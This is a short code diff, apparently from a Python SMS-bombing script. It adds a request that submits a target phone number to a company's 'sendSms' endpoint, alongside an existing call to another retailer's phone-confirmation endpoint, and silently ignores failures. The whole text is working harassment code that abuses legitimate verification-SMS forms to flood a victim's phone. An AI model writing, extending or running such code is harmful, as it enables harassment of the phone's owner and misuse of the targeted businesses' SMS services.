@@ -2496,7 +2496,14 @@ def sms(prx, number, tm, code):
 					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header)
 				except:
 					pass
-					
+
+				try:
+					requests.post('https://www.etm.ru/cat/runprog.html',
+								  data={'m_phone': number, 'mode': 'sendSms', 'syf_prog': 'clients-services',
+										'getSysParam': 'yes'}, headers=header, timeout=5.05)
+				except:
+					pass
+
 		else:
 			pass
 
